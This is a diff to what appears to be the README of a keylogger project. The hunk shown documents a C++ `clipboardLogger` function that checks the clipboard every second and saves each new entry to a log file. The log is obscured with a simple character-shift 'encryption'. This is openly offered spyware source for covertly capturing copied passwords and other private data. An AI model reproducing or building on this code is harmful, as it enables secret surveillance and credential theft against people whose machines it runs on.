@@ -123,8 +123,22 @@ The `clipboardLogger` function is responsible for periodically checking the clip
 - **Detecting Changes**: It compares the current clipboard content with the previously logged content. If there is new content that differs from what was previously stored, it logs this content.
 - **Logging and Encryption**: New clipboard content is logged by calling the `save` function, which encrypts the content using a simple character shift.
 
-cpp
+```c++
+void clipboardLogger(int key) {
+    string previousClipboardContent;
 
-Copy code
+    while (true) {
+        Sleep(1000);
 
-`void clipboardLogger(int key, atomic<bool>& running) {     string previousClipboardContent;      while (running) {         try {             Sleep(1000);              string currentClipboardContent = getClipboardText();              if (!currentClipboardContent.empty() && currentClipboardContent != previousClipboardContent) {                 save("\n[+]Clipboard: " + currentClipboardContent + "\n", key);                 previousClipboardContent = currentClipboardContent;             }         } catch (const exception& e) {             cerr << "Clipboard error: " << e.what() << endl;         }     } }`
+        string currentClipboardContent = getClipboardText();
+
+        if (!currentClipboardContent.empty() && currentClipboardContent != previousClipboardContent) {
+            save("\n[+]Clipboard: " + currentClipboardContent + "\n", key);
+            previousClipboardContent = currentClipboardContent;
+        }
+    }
+}
+```
+
+### Encrypt and decrypt the logfile
+#### Function: `save(void save(const string& input, int key))`
